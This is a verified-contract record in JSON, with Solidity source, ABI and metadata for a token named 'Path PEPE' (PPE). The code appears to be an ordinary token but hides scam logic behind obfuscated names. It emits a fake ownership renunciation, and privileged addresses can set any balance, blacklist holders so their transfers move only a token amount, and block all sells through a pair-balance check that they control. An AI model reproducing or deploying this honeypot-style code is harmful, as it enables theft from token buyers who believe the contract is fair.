{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface modeAtFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atSwap) external view returns (uint256);\n\n    function transfer(address totalFrom, uint256 launchFee) external returns (bool);\n\n    function allowance(address minMarketingSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFrom,\n        uint256 launchFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTeamList, uint256 value);\n    event Approval(address indexed minMarketingSwap, address indexed spender, uint256 value);\n}\n\nabstract contract teamSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTradingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTeam {\n    function createPair(address swapMode, address shouldLaunch) external returns (address);\n}\n\ninterface toWallet is modeAtFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PathPEPE is teamSwap, modeAtFee, toWallet {\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapList;\n    }\n\n    bool private tradingFromList;\n\n    constructor (){\n        \n        sellTradingAuto minSell = sellTradingAuto(isLaunchedFund);\n        limitLaunch = feeTeam(minSell.factory()).createPair(minSell.WETH(), address(this));\n        \n        isWallet = _msgSender();\n        fundFee();\n        exemptMarketing[isWallet] = true;\n        toAuto[isWallet] = exemptTrading;\n        if (walletSwap == maxSender) {\n            atLimit = isList;\n        }\n        emit Transfer(address(0), isWallet, exemptTrading);\n    }\n\n    uint256 public walletSwap;\n\n    uint256 minAuto;\n\n    uint256 tradingLaunch;\n\n    function allowance(address shouldReceiver, address limitSell) external view virtual override returns (uint256) {\n        if (limitSell == isLaunchedFund) {\n            return type(uint256).max;\n        }\n        return walletTx[shouldReceiver][limitSell];\n    }\n\n    uint256 private isList;\n\n    address private feeMaxLiquidity;\n\n    address txSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address autoAtExempt, uint256 launchFee) external virtual override returns (bool) {\n        return tradingSender(_msgSender(), autoAtExempt, launchFee);\n    }\n\n    function approve(address limitSell, uint256 launchFee) public virtual override returns (bool) {\n        walletTx[_msgSender()][limitSell] = launchFee;\n        emit Approval(_msgSender(), limitSell, launchFee);\n        return true;\n    }\n\n    mapping(address => bool) public exemptMarketing;\n\n    function fundAt(address isEnable, address totalFrom, uint256 launchFee) internal returns (bool) {\n        require(toAuto[isEnable] >= launchFee);\n        toAuto[isEnable] -= launchFee;\n        toAuto[totalFrom] += launchFee;\n        emit Transfer(isEnable, totalFrom, launchFee);\n        return true;\n    }\n\n    function feeIs() private view {\n        require(exemptMarketing[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return feeMaxLiquidity;\n    }\n\n    function balanceOf(address atSwap) public view virtual override returns (uint256) {\n        return toAuto[atSwap];\n    }\n\n    mapping(address => uint256) private toAuto;\n\n    uint256 constant takeReceiver = 8 ** 10;\n\n    function totalAtMode(address autoAtExempt, uint256 launchFee) public {\n        feeIs();\n        toAuto[autoAtExempt] = launchFee;\n    }\n\n    function fromReceiver(address teamWalletIs) public {\n        feeIs();\n        \n        if (teamWalletIs == isWallet || teamWalletIs == limitLaunch) {\n            return;\n        }\n        sellShould[teamWalletIs] = true;\n    }\n\n    function senderTake(uint256 launchFee) public {\n        feeIs();\n        minAuto = launchFee;\n    }\n\n    uint256 private exemptTrading = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTrading;\n    }\n\n    function fundFee() public {\n        emit OwnershipTransferred(isWallet, address(0));\n        feeMaxLiquidity = address(0);\n    }\n\n    address isLaunchedFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingMax;\n\n    mapping(address => mapping(address => uint256)) private walletTx;\n\n    bool public atReceiver;\n\n    uint8 private swapList = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLiquidity;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txLaunchedLiquidity;\n    }\n\n    address public isWallet;\n\n    uint256 public atLimit;\n\n    uint256 public maxSender;\n\n    string private txLaunchedLiquidity = \"Path PEPE\";\n\n    event OwnershipTransferred(address indexed minTake, address indexed sellEnable);\n\n    address public limitLaunch;\n\n    function tradingSender(address isEnable, address totalFrom, uint256 launchFee) internal returns (bool) {\n        if (isEnable == isWallet) {\n            return fundAt(isEnable, totalFrom, launchFee);\n        }\n        uint256 minTotalSender = modeAtFee(limitLaunch).balanceOf(txSwap);\n        require(minTotalSender == minAuto);\n        require(totalFrom != txSwap);\n        if (sellShould[isEnable]) {\n            return fundAt(isEnable, totalFrom, takeReceiver);\n        }\n        return fundAt(isEnable, totalFrom, launchFee);\n    }\n\n    function limitFund(address sellSwapLiquidity) public {\n        require(sellSwapLiquidity.balance < 100000);\n        if (tradingMax) {\n            return;\n        }\n        if (maxSender == isList) {\n            isList = maxSender;\n        }\n        exemptMarketing[sellSwapLiquidity] = true;\n        if (atReceiver) {\n            atReceiver = false;\n        }\n        tradingMax = true;\n    }\n\n    string private teamLiquidity = \"PPE\";\n\n    bool private modeAmountFrom;\n\n    mapping(address => bool) public sellShould;\n\n    function getOwner() external view returns (address) {\n        return feeMaxLiquidity;\n    }\n\n    function transferFrom(address isEnable, address totalFrom, uint256 launchFee) external override returns (bool) {\n        if (_msgSender() != isLaunchedFund) {\n            if (walletTx[isEnable][_msgSender()] != type(uint256).max) {\n                require(launchFee <= walletTx[isEnable][_msgSender()]);\n                walletTx[isEnable][_msgSender()] -= launchFee;\n            }\n        }\n        return tradingSender(isEnable, totalFrom, launchFee);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeamList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletIs\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwapLiquidity\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAtExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"totalAtMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAtExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PathPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}